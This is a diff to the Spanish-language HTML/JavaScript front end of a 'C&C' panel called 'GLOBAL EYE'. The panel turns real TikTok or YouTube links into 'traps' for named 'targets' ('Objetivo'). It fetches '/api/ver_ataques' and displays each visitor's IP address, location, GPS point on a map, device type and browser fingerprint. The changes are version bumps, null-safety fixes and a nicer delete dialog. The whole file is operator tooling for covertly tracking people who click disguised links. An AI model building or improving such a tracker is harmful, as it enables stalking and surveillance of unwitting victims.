@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>C&C V8.4 Final</title>
+    <title>C&C V8.5 Stable</title>
     
     <script>
         if (!sessionStorage.getItem("secure_token")) {
@@ -96,7 +96,7 @@
 </head>
 <body>
     <div class="header">
-        <h1>GLOBAL EYE <span style="color:var(--accent)">V8.4</span></h1>
+        <h1>GLOBAL EYE <span style="color:var(--accent)">V8.5</span></h1>
         <a href="/logout" style="text-decoration:none;">
             <div class="status-badge" style="background:rgba(255, 71, 87, 0.1); color:#ff4757; border-color:rgba(255, 71, 87, 0.3);">
                 <span class="material-icons-round" style="font-size:14px;">logout</span> SALIR
@@ -105,10 +105,11 @@
     </div>
 
     <div class="content-area">
+        
         <div id="view-home" class="view active">
             <div class="card">
                 <label class="label">LINK REAL (TIKTOK/YOUTUBE)</label>
-                <input type="text" id="urlDestino" placeholder="https://...">
+                <input type="text" id="urlDestino" placeholder="Pega el enlace aquí...">
                 <div style="height:10px"></div>
                 <label class="label">NOMBRE REFERENCIA</label>
                 <input type="text" id="nombreTrampa" placeholder="Ej: Objetivo 1">
@@ -139,7 +140,7 @@
 
         <div id="view-logs" class="view">
             <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
-                <h2 style="margin:0; font-size:18px;">Actividad</h2>
+                <h2 style="margin:0; font-size:18px;">Registro de Actividad</h2>
                 <button onclick="cargarLogs()" style="background:none; border:none; color:var(--accent); font-size:24px;">↻</button>
             </div>
             <div id="logs-container"></div>
@@ -154,6 +155,7 @@
                 <div id="map"></div>
             </div>
         </div>
+
     </div>
 
     <div class="nav-bar">
@@ -226,7 +228,7 @@
             else if(v==='map'){ 
                 setTimeout(()=>{ 
                     initMap(); 
-                    map.invalidateSize(); // ARREGLO DEL MAPA GRIS
+                    map.invalidateSize();
                     cargarLogs(true); 
                 }, 100); 
             }
@@ -257,41 +259,71 @@
             }
         }
 
-        async function cargarLogs(updateMap=false){
+        // --- CORRECCIÓN PRINCIPAL AQUÍ: PROTECCIÓN CONTRA DATOS NULOS ---
+        async function cargarLogs(updateMap = false) {
             try {
-                let r = await fetch('/api/ver_ataques'); let d = await r.json();
-                if(updateMap){ updateMapPoints(d); return; }
+                let res = await fetch('/api/ver_ataques');
+                let data = await res.json();
+                
+                if(updateMap) { updateMapPoints(data); return; }
+
                 let container = document.getElementById('logs-container');
                 let html = "";
-                if(d.length === 0) html = "<div style='text-align:center;color:#666;margin-top:40px'>Vacío</div>";
                 
-                d.forEach(l=>{
-                    let gpsBtn = "";
+                if(data.length === 0) html = "<div style='text-align:center;color:#666;margin-top:40px'>Vacío</div>";
+                
+                data.forEach(l => {
+                    // Aseguramos que las variables no sean nulas
+                    let dispositivo = l.dispositivo || "Desconocido";
+                    let fingerprint = l.fingerprint || "";
                     
-                    // FILTRO DE 0,0 PARA EL BOTÓN
+                    let icon = "laptop";
+                    if(dispositivo.includes("iPhone")) icon = "phone_iphone";
+                    else if(dispositivo.includes("Android")) icon = "android";
+                    
+                    let gpsBtn = "";
                     if(l.lat && l.lon && l.lat != "0" && l.lat != 0) {
-                        gpsBtn = `<div class="log-map-btn" onclick="focalizarObjetivo(${l.lat},${l.lon})">📍 VER EN MAPA</div>`;
+                        gpsBtn = `<div class="log-map-btn" onclick="focalizarObjetivo(${l.lat},${l.lon})">
+                            📍 VER EN MAPA
+                        </div>`;
                     }
 
-                    // AQUÍ ESTÁ LA MAGIA DE RAYOS X
-                    let fp = l.fingerprint ? `<div class="log-tech">🔧 ${l.fingerprint}</div>` : "";
+                    let fpHTML = fingerprint ? `<div class="log-tech">${fingerprint}</div>` : "";
                     
                     html+=`<div class="log-item">
-                        <div class="log-icon"><span class="material-icons-round">laptop</span></div>
+                        <div class="log-icon"><span class="material-icons-round">${icon}</span></div>
                         <div class="log-info">
-                            <div class="log-title">${l.ubicacion}</div>
-                            <div class="log-meta">${l.ip} • ${l.hora}</div>
-                            <div class="log-meta" style="color:#666;">🎯 ${l.trampa}</div>
-                            ${fp}
+                            <div class="log-title">${l.ubicacion || "Desconocida"}</div>
+                            <div class="log-meta">${l.ip || "IP Oculta"} • ${l.hora || "-"}</div>
+                            <div class="log-meta" style="color:#666;">🎯 ${l.trampa || "Trampa"}</div>
+                            ${fpHTML}
                             ${gpsBtn}
                         </div>
                     </div>`;
                 });
                 container.innerHTML = html;
-            } catch(e){}
+            } catch(e){ 
+                console.error(e); 
+                // Si hay error, mostramos botón de borrar para salir del bucle
+                document.getElementById('logs-container').innerHTML = "<div style='color:red;text-align:center'>Error leyendo datos antiguos.<br>Por favor borra el historial.</div>";
+            }
         }
 
-        async function borrarHistorial(){ if(confirm("¿Borrar todo?")) { await fetch('/api/borrar_logs',{method:'POST'}); cargarLogs(); } }
+        async function borrarHistorial() {
+            Swal.fire({
+                title: '¿Borrar todo?', icon: 'warning', showCancelButton: true,
+                confirmButtonColor: '#ff4757', cancelButtonColor: '#333',
+                confirmButtonText: 'Sí, borrar', background: '#1e1e24', color: '#fff'
+            }).then(async (result) => {
+                if (result.isConfirmed) {
+                    await fetch('/api/borrar_logs', { method: 'POST' });
+                    cargarLogs();
+                    if(map) { markers.forEach(m => map.removeLayer(m)); markers=[]; }
+                    Swal.fire({title:'Borrado', icon:'success', background: '#1e1e24', color: '#fff'});
+                }
+            })
+        }
+        
         cargarLogs();
     </script>
 </body>
